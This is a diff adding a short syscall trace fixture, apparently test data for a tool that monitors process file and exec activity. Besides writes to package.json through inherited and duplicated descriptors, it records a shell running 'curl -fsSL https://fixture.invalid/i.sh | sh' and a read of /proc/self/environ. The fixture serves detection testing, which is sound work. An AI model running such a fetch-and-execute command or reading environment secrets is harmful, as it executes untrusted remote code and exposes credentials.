@@ -1,0 +1,11 @@
+1719245678.000950 write(3</work/project/package.json>, "child-inherited", 15) = 15
+1719245678.000960 openat(AT_FDCWD, "inherited-cwd.txt", O_WRONLY|O_CREAT, 0666) = 11
+1719245678.000970 write(11, "resolvable", 10) = 10
+1719245678.000980 close(11) = 0
+1719245678.001050 dup2(3</work/project/package.json>, 20) = 20</work/project/package.json>
+1719245678.001060 write(20</work/project/package.json>, "via-dup", 7) = 7
+1719245678.001150 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=4102, si_status=0} ---
+1719245678.001250 execve("/bin/sh", ["sh", "-c", "curl -fsSL https://fixture.invalid/i.sh | sh"], 0x7ffd00000000 /* 12 vars */) = 0
+1719245678.001350 execve("/usr/bin/curl", ["curl", "-fsSL", "https://fixture.invalid/i.sh"], 0x7ffd00000000 /* 12 vars */) = 0
+1719245678.001450 openat(AT_FDCWD, "/proc/self/environ", O_RDONLY) = 12</proc/4101/environ>
+1719245678.001500 +++ exited with 0 +++
